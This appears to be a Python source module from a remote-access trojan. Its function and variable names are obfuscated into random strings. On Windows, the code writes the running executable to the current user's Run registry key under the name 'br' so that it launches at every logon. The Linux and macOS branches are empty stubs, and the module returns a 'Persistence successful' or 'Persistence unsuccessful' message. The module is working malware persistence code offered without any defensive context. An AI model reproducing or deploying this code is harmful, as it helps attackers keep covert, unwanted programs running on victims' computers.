# -*- coding: utf-8 -*-
import sys
def srOXhtoTWVPOQTAFQsEjXglmECQYMydH():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    ejhEOFlPViXKPUHKJhcSyqqQjSUcagli = r'Software\Microsoft\Windows\CurrentVersion\Run'
    MtcFrCNqZIqaQyIxdGTfhTosybVfegHt = sys.executable
    try:
        SCyNiWCgkJlizIsydlByszPSbHjrsmmo = _winreg.OpenKey(HKCU, ejhEOFlPViXKPUHKJhcSyqqQjSUcagli, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(SCyNiWCgkJlizIsydlByszPSbHjrsmmo, 'br', 0, _winreg.REG_SZ, MtcFrCNqZIqaQyIxdGTfhTosybVfegHt)
        _winreg.CloseKey(SCyNiWCgkJlizIsydlByszPSbHjrsmmo)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def lrTEHXeiGcEwKXpdLgsftDfIvDdRXoll():
    return False, 'nothing here yet'
def TbRmIskDAkJNqojbNNHSQSSGqnNOySFF():
    return False, 'nothing here yet'
def mBuXjpkzrIUZngwxvXemPAvEUwbDTnHC(plat_type):
    if plat_type.startswith('win'):
        txzIakPdlJAfxXwadheCXgIJeaxZBZie, NHbXgUTKKrdEJToqpVPMzqYsotmPgTaA = srOXhtoTWVPOQTAFQsEjXglmECQYMydH()
    elif plat_type.startswith('linux'):
        txzIakPdlJAfxXwadheCXgIJeaxZBZie, NHbXgUTKKrdEJToqpVPMzqYsotmPgTaA = lrTEHXeiGcEwKXpdLgsftDfIvDdRXoll()
    elif plat_type.startswith('darwin'):
        txzIakPdlJAfxXwadheCXgIJeaxZBZie, NHbXgUTKKrdEJToqpVPMzqYsotmPgTaA = TbRmIskDAkJNqojbNNHSQSSGqnNOySFF()
    else:
        return 'Error, platform unsupported.'
    if txzIakPdlJAfxXwadheCXgIJeaxZBZie:
        CqLCFAGiFKpkaszSdjEiaizEkGPltyhw = 'Persistence successful, {}.'.format(NHbXgUTKKrdEJToqpVPMzqYsotmPgTaA)
    else:
        CqLCFAGiFKpkaszSdjEiaizEkGPltyhw = 'Persistence unsuccessful, {}.'.format(NHbXgUTKKrdEJToqpVPMzqYsotmPgTaA)
    return CqLCFAGiFKpkaszSdjEiaizEkGPltyhw
